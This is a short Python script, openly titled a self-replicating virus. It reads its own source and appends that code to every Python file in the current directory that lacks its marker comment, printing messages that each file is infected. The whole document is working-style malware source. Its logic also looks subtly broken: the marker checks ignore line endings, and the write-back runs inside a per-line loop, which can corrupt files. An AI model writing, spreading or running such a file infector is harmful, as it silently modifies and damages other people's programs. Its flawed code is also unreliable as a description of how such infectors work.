#Self-replicating virus
import sys
import glob
virus_code=[]
#reading it's own code
with open(sys.argv[0],'r') as f:  #array that contains command-line arguments passed to the scriptt
  lines=f.readlines()
self_replication=False
for i in lines:
  if i=="#Self-replicating virus":
    self_replication=True
  if self_replication==False:
    virus_code.append(i)
  if i=="#Virus end":
    break
#Find python files and read the code

python_files=glob.glob('*.py')
print(python_files)
for files in python_files:
  with open(files,'r') as f:
    file_code=f.readlines()
  infected=False
  for file in file_code:
    if file=="#Self-replicating virus\n":
      infected=True
      print('The file is already infected')
      break
    if infected==False:
      newcode=[]
      newcode.extend(file_code)
      newcode.extend('\n')
      newcode.extend(virus_code)
      f=open(files,'w')
      f.writelines(newcode)
  print("The file {} is now infected".format(files))

#Virus end
